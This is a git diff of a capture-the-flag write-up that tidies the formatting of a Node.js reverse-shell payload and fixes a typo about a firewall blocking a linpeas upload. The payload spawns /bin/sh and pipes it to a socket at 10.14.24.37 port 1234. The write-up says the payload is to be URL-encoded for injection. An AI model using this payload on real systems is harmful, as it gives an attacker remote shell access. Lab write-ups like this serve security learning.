@@ -108,8 +108,7 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 * now its time to create a javascript payload
 
 ```js
-var net = require("net"),sh = require("child_process").exec("/bin/sh");var client = new net.Socket();client.connect(1234, "10.14.24.37", function(){
-	client.pipe(sh.stdin);	sh.stdout.pipe(client);	sh.stderr.pipe(client);});
+var net = require("net"),sh = require("child_process").exec("/bin/sh");var client = new net.Socket();client.connect(1234, "10.14.24.37", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
 ```
 * use `URL encode` to encode our payload
 ```
@@ -231,7 +230,7 @@ This system is built by the Bento project by Chef Software
 More information can be found at https://github.com/chef/bento
 pietro@ultron:~$ 
 ```
-* We can't run upload the `linpeas.sh` script to box because the `Firewall` blocking the connection.
+* We can't upload the `linpeas.sh` script to box because the `Firewall` blocking the connection.
 * lets enumerate manualy.
 * After some enumeration Found a SSH key to login
 ```
